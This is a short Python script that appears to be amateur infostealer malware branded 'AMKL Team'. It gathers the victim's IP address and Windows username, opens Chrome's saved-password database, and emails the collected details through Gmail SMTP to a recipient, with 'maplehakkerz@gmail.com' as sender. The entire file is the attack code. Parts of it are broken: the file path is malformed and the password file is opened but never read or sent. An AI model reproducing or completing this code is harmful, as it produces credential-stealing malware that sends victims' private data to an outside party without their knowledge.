import smtplib
import getpass
import socket
from email.mime.text import MIMEText
from email.header import Header

hostname = socket.gethostbyname(socket.gethostname())
username = getpass.getuser()
f = open('C:\\Users' + username + '\AppData\Local\Google\Chrome\\User Data\Default\Login Data', "r")

def send():
    mailsender = smtplib.SMTP('smtp.gmail.com', 587)
    mailsender.starttls()
    mailsender.login('s', 's')
    mail_recipient = "s"
    mail_subject = 'AMKL Team'
    mail_body = 'IP: ' + hostname + '\nUsername: ' + username + '\nAMKL Team'
    msg = MIMEText(mail_body, 'plain', 'utf-8')
    msg['Subject'] = Header(mail_subject, 'utf-8')
    mailsender.sendmail('maplehakkerz@gmail.com', mail_recipient, msg.as_string())
    mailsender.quit()
send()
